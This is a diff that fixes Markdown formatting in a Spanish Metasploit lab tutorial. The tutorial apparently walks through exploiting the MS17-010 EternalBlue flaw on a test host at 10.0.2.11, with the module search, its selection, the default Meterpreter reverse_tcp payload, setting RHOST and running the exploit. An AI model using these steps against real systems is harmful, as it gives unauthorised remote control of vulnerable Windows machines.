@@ -36,30 +36,30 @@ Con esta herramienta descubriremos puertos y servicios abiertos en la máquina o
 
 En la primera fase ejecutaremos este framework para buscar exploits usar y deescargar payloads y ejecutarlos.
 
-*msfconsole
+*msfconsole*
 
 
 
 Usaremos su buscador para encontrar el exploit:
 
-*search eternalblue
+*search eternalblue*
 
 
 De los resultados elegiremos la primera opción:
 
 N   Name                                      Disclosure      Date     Rank   Check    Description
--  --                                        -- -- -- --      -- --    -- --  -- -- -- -- -- 
+-  ____                                        -- -- -- --      -- --    -- --  -- -- -- -- -- 
 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 
-*use 0
+*use 0*
 
 Nos duvuelve:
 
-*No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+*No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp*
 
 
 Vemos que parámetros son requeridos con el comando:
-*options
+*options*
 
 
 nos pide datos del equipo remoto o *RHOST*. Le indicamos la ip del equipo remoto 10.0.2.11
@@ -73,9 +73,9 @@ Vamos a realizar la prueba con el siguiente *windows/x64/meterpreter/reverse_tcp
 
 
 
-Le indicamos que se ejecute con *run
+Le indicamos que se ejecute con *run*
 
 
 
 
-Podemos ver las distintas opciones que nos ofrece este exploit con *options
+Podemos ver las distintas opciones que nos ofrece este exploit con *options*
